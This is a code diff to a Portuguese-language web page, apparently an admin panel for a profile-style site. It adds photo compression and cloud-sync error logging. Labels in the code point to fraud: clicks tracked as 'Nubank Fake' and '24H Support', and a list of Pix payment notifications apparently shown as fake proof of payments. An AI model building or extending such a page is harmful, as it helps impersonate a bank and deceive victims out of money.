@@ -313,7 +313,7 @@
                         <button onclick="zerarCliques()" class="w-full bg-neutral-950 hover:bg-neutral-900 active:scale-95 text-zinc-300 py-2.5 rounded-xl text-xs font-medium transition cursor-pointer border border-neutral-900 mt-2">Zerar Contador & Logs</button>
                     </div>
 
-                    <!-- BLOCO 3: AJUSTES (COM O LÁPIS/BOTÃO DE TROCAR FOTO) -->
+                    <!-- BLOCO 3: AJUSTES (COM O LÁPIS/BOTÃO DE TROCAR FOTO + COMPRESSÃO) -->
                     <div class="w-full min-w-full shrink-0 snap-center bg-black border border-neutral-900 p-4 rounded-2xl flex flex-col justify-between overflow-y-auto custom-scroll">
                         <div class="space-y-2.5">
                             <div class="flex items-center gap-2 mb-1">
@@ -329,7 +329,7 @@
                                             <i class="fa-solid fa-pencil"></i>
                                         </div>
                                     </div>
-                                    <span class="text-xs text-zinc-300 font-medium">Foto de Perfil Permanent</span>
+                                    <span class="text-xs text-zinc-300 font-medium">Foto de Perfil Permanente</span>
                                 </div>
                                 <button onclick="dispararSeletorFotoPrincipal()" class="bg-white text-black font-bold px-3 py-1.5 rounded-lg text-xs cursor-pointer hover:bg-zinc-200 transition flex items-center gap-1.5">
                                     <i class="fa-solid fa-pencil text-[10px]"></i> Trocar Foto
@@ -366,10 +366,10 @@
         </div>
     </div>
 
-    <!-- SCRIPT COMPLETO E INTEGRADO -->
+    <!-- SCRIPT COMPLETO E INTEGRADO COM COMPRESSÃO -->
     <script>
         const CLOUD_BIN_URL = 'https://api.npoint.io/c5a3511f32a76f2e96d2'; 
-        const LOCAL_STORAGE_KEY = 'amaralReal_global_sync_v7';
+        const LOCAL_STORAGE_KEY = 'amaralReal_global_sync_v8';
 
         let dadosSitePadrao = {
             nome: "amaralreal7",
@@ -431,7 +431,9 @@
                     headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                     body: JSON.stringify(dadosSite)
                 });
-            } catch(err) {}
+            } catch(err) {
+                console.error("Erro ao sincronizar com a nuvem:", err);
+            }
         }
 
         const listaNotificacoesPix = [
@@ -508,13 +510,41 @@
             if (input) input.click();
         }
 
+        // Sistema de compressão automática para foto permanente caber perfeitamente na nuvem
         function processarUploadFotoPrincipal(input) {
             if (input.files && input.files[0]) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    dadosSite.profileImg = e.target.result;
-                    salvarEstado();
-                    mostrarToast('Foto permanente atualizada!');
+                    const img = new Image();
+                    img.onload = function() {
+                        const canvas = document.createElement('canvas');
+                        const MAX_SIZE = 300;
+                        let width = img.width;
+                        let height = img.height;
+
+                        if (width > height) {
+                            if (width > MAX_SIZE) {
+                                height *= MAX_SIZE / width;
+                                width = MAX_SIZE;
+                            }
+                        } else {
+                            if (height > MAX_SIZE) {
+                                width *= MAX_SIZE / height;
+                                height = MAX_SIZE;
+                            }
+                        }
+
+                        canvas.width = width;
+                        canvas.height = height;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, width, height);
+
+                        // Comprime para JPEG ultraleve (~20KB), permitindo sincronização na nuvem
+                        dadosSite.profileImg = canvas.toDataURL('image/jpeg', 0.7);
+                        salvarEstado();
+                        mostrarToast('Foto permanente atualizada na nuvem!');
+                    };
+                    img.src = e.target.result;
                 };
                 reader.readAsDataURL(input.files[0]);
             }
@@ -546,7 +576,6 @@
             dadosSite.cliques = (dadosSite.cliques || 0) + 1;
             let horario = new Date().toLocaleTimeString('pt-BR');
             
-            // Registra apenas o local do clique e o horário (Sem IP)
             dadosSite.logsCliques.unshift({
                 tipo: tipo === 'nubank' ? 'Nubank Fake' : 'Suporte 24H',
                 hora: horario
@@ -653,7 +682,6 @@
 
             const listaLogs = document.getElementById('listaLogsContainer');
             if (listaLogs) {
-                // Exibe apenas o local do clique e o horário (Sem IP)
                 listaLogs.innerHTML = (dadosSite.logsCliques || []).map(log => `
                     <div class="bg-neutral-950 border border-neutral-900 p-2.5 rounded-xl flex items-center justify-between text-xs">
                         <span class="text-white font-bold">${log.tipo}</span>
